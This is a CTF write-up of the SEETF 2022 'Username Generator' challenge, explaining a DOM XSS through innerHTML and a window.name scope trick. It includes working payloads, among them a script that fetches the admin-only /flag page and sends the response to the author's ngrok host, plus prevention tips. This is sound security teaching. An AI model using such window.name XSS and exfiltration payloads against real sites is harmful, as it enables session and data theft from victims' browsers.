# SEETF 2022 write-up - Username Generator

![](https://i.imgur.com/4ooI8fj.png)

SEETF is a cybersecurity Capture the Flag competition hosted by the Social Engineering Experts CTF team.

![](https://i.imgur.com/iYDHwHw.png)

Altough the name is about Social Engineering, I worked on some really fun web challenges.

This was a simple one, but with a tricky bypass that was nice enough for a write-up.

Challenge is not available anymore on the server, so I'll simulate it locally.

[Official Source-code](https://github.com/Social-Engineering-Experts/SEETF-2022-Public/tree/main/web/username-generator) is available for those who want to try it out.

## The Challenge

Let's start the app:

```
$ docker-compose up
Starting distrib_admin_1 ... done
Starting distrib_app_1   ... done
Attaching to distrib_admin_1, distrib_app_1
app_1    | [2022-06-19 17:14:46 +0000] [1] [INFO] Starting gunicorn 20.1.0
app_1    | [2022-06-19 17:14:46 +0000] [1] [INFO] Listening at: http://0.0.0.0:80 (1)
app_1    | [2022-06-19 17:14:46 +0000] [1] [INFO] Using worker: sync
app_1    | [2022-06-19 17:14:46 +0000] [7] [INFO] Booting worker with pid: 7
admin_1  | [0619/171457.986767:ERROR:bus.cc(393)] Failed to connect to the bus: Failed to connect to socket /var/run/dbus/system_bus_socket: No such file or directory
admin_1  | [0619/171458.443470:ERROR:viz_main_impl.cc(150)] Exiting GPU process due to errors during initialization
admin_1  | [0619/171458.627721:ERROR:gpu_init.cc(426)] Passthrough is not supported, GL is disabled
admin_1  | [*] Listening on port 8000
```

![](https://i.imgur.com/7kHLkxb.png)

Simple site. It generates a username, which is basically a random string of a number of chars that you choose, defaulting to 10.

It's a [XSS](https://portswigger.net/web-security/cross-site-scripting) challenge. In those kind of challenges, there is an admin bot, which usually have cookies or Local Storage in the domain of the challenge app.
The mission is to trigger a XSS in the app, so we can hijack this "protected" information to perform admin-only operations.

## Analysis

### Main App

The app code is quite simple.

```python
from flask import Flask, render_template, request
import socket
import os

app = Flask(__name__)
admin_ip = socket.gethostbyname("admin")


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/flag')
def flag():
    if request.remote_addr == admin_ip:
        return os.environ["FLAG"]

    else:
        return "You are not admin!"


if __name__ == '__main__':
    app.run()
```

**Summary**
- Renders an index.html template for the app root (/).
- Gives the flag if the request is coming from the admin IP Address.
- We don't have any code here related to the username generation.

Since we can't perform the request from the Admin IP, we don't have access to the flag.

Right? Never that simple.

### Client-side

The index.html doesn't have a lot, just a simple form for sending a GET to / with the new number of chars (field `length`).

```html
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width" />

        <title>Username Generator</title>
        
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
        <script defer src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
        <script defer src="{{ url_for('static', filename='index.js') }}"></script>
    </head>
    <body>
        <div class="container">
            <h1>Username Generator</h1>
            <p>Can't think of a username for a service you're signing up for?</p>
            <p>Look no further, this website will generate a username for you!</p>

            <p id="generatedUsername"></p>

            <form action="/" method="get">
                <div class="form-group row">
                    <label for="length" class="col-sm-2 col-form-label">Length</label>
                    <div class="col-sm-8">
                        <input type="number" class="form-control" id="length" name="length" value="10">
                    </div>
                    <div class="col-sm-2">
                        <button type="submit" class="btn btn-primary mb-2">Generate</button>
                    </div>
                </div>
            </form>
        </div>
    </body>
</html>
```

The index.js javascript referenced there deserves most of our attention.

```javascript
const generate = (length) => {
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

const queryString = window.location.search;
const parameters = new URLSearchParams(queryString);
const usernameLength = parameters.get('length');

// Generate a random username and display it
if (usernameLength === null) {
    var name = "loading...";
    window.location.href = "/?length=10";
}
else if (usernameLength.length > 0) {
    var name = generate(+usernameLength);
}
document.getElementById('generatedUsername').innerHTML = `Your generated username is: ${name}`;
```

**Summary**
- Have a function to generate the random username (we can ignore it)
- Get the length parameter from the URL
    - Format `/?length=10`
- If there is no `length` parameter, redirect it to the default of 10.
- If the value is sent, generate it with the number of the parameter.
- Sets the innerHTML here to a string with the new generated username.

innerHTML...

![](https://i.imgur.com/LQbxngA.png)

## XSS Hunt

It's very clear here that we have to exploit a XSS using the innerHTML flaw.

```javascript
document.getElementById('generatedUsername').innerHTML = `Your generated username is: ${name}`;
```

For this, we have to inject some HTML/Javascript Payload in the `name` variable.

In the first look at the code, it looks like we can't set the name variable, since it is only set for the result of the `generate` function.

There are two things to observe here:

### Nameless code

The name is only set on specific conditions:
- `length` parameter is null
- `length` parameter is set to a string value with length > 0

If we pass a value that do not trigger those conditions, name is not set by the `index.js` code.

If we can somehow set the name value before, it won't get overwritten.

### Name Scope

There is a not-that-obvious flaw here in how Javascript scope its global variables. They are set in the `window` object.

![](https://i.imgur.com/GGIeW96.png)

If we set the `window.name` before loading the page, we control the `name` local variable and we can inject our payload.

![](https://i.imgur.com/hs6jlWz.png)

### HTML Injection

Let's prove we can inject code using the innerHTML.

Let's fire our ngrok and serve the poisoned page below:

```html
<html>
<script id='starter'>
    window.name = '<img src="http://7f0d-2804-14d-5cd0-9fd9-def-e5eb-a371-d855.ngrok.io/img.jpg">';
    window.location.href = 'http://localhost/?length=';
</script>
</html>
```

**Summary**
- Served by URL `http://7f0d-2804-14d-5cd0-9fd9-def-e5eb-a371-d855.ngrok.io/xss_poc.html`.
- Changes the window.name to an `img` tag, which points to our ngrok in a random url.
- Redirects the same window to `http://localhost/?length=`.

The empty length is different than null, so it does not trigger the conditions to change the name `variable`.

After loading the xss_poc.html, the browser is redirected successfully.

![](https://i.imgur.com/yXAniqU.png)

If we take a look at the current HTML, the image is there:

![](https://i.imgur.com/TCWDsjK.png)

![](https://i.imgur.com/cmQ8Wnz.png)

XSS PoC worked fine and we received the img in our ngrok.

Moving to next level.

### XSS

HTML is not enough. We need to run Javascript code on the Bot.
We can try to replace the `img` by a `script` tag, but [it does not fire the script](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations) on innerHTML changes. This is part of [DOM specification](https://www.w3.org/TR/2008/WD-html5-20080610/dom.html#innerhtml0).

But...

![](https://i.imgur.com/FZnWmnx.gif)

We can't directly insert the `script` tag, but we can change our `img` tag with an onerror event, to trigger our script for an invalid URL.

Let's try our brand new xss_poc2.html.

```html
<html>
<script id='starter'>
    window.name = '<img src="http://wrong-domain.ngrok.io/img.jpg" onerror="alert(1);">';
    window.location.href = 'http://localhost/?length=';
</script>
</html>
```

![](https://i.imgur.com/1Q6jvj7.png)

Now we got a XSS to to trigger javascript on the bot browser.

## CRSF

Let's move to our objective which is getting the flag, that's on the `/flag` route.
Since we can XSS-inject javascript on the browser bot, we can make it call `/flag` from inside the admin bot browser and, with the response in hands, send it to our ngrok host. The so-called [CSRF](https://portswigger.net/web-security/csrf).

Now I need a little bigger javascript to trigger on the `img` on error event. To make it more readable, I created a formatted script tag and just get the innerHTML to fill the onerror event.

Let's move to `seectf-2022-redirector.html`.

```html
<html>
<script id='payload'>
    base_addr = 'http://7f0d-2804-14d-5cd0-9fd9-def-e5eb-a371-d855.ngrok.io';
    fetch('/flag')
        .then((response) => response.text())
        .then(
            (text) => 
                fetch(base_addr + '/flagleak?data=' + encodeURIComponent(text), {
                    'mode': 'no-cors'
                })
        );
</script>
<script id='starter'>
    payload = document.getElementById('payload').innerHTML;
    window.name = '<img src="http://any.xngrok.io/img.jpg" onerror="'+payload+'">';
    window.location.href = 'http://app2/?length=';
</script>
</html>
```

It does what we want, sending the leaked flag to our ngrok.

From here on, we need to use our local Admin Bot to test it, since it checks for the admin ip and we don't have it. The admin is the IP returned by the name "admin" on the Docker Network.

It's listening on port 8000.
Let's knock on it and send our poison.

![](https://i.imgur.com/etU9NJh.png)

After some 2 seconds coffee...

![](https://i.imgur.com/mkiZFCf.png)

And... in the real challenge.

![](https://i.imgur.com/jVD0aW1.png)

Flag is ours.

## Lessons Learned

Most parts of this challenge are common in XSS challenges. The new thing here (for me) was using a controlled window to inject variables on a page of another domain.

That was awesome and now part of the utilities belt.

![](https://i.imgur.com/IEWaHjm.png)

## Preventing

- Always use HTTPS and set your cookies [Secure](https://owasp.org/www-community/controls/SecureCookieAttribute).
- Using [httpOnly](https://owasp.org/www-community/HttpOnly) cookies, whenever possible.
    - Avoid cookie stealing using `document.cookie`.
- [SameSite cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite) would also probably help.
- Initialize your variables :)
    - Using a non-initialized variable may cause bugs in your app and, in extreme cases, lead to hacks.

I'm sure I'm forgetting other important protections here. Send me hints for better security on [Twitter](https://twitter.com/NeptunianHacks).

## References
* [CTF Time Event](https://ctftime.org/event/1543)
* [Github repo with the artifacts discussed here](https://github.com/Neptunians/tsj-2022-writeups)
* [XSS](https://portswigger.net/web-security/cross-site-scripting)
* [CSRF](https://portswigger.net/web-security/csrf)
* [ngrok](https://ngrok.com/)
* [Secure Cookies](https://owasp.org/www-community/controls/SecureCookieAttribute)
* [CRSF tokens](https://portswigger.net/web-security/csrf/tokens)
* [httpOnly](https://owasp.org/www-community/HttpOnly)
* [SameSite cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite) 
* Team: [FireShell](https://fireshellsecurity.team/)
* Team Twitter: [@fireshellst](https://twitter.com/fireshellst)
* Follow me too :) [@NeptunianHacks](https://twitter.com/NeptunianHacks) 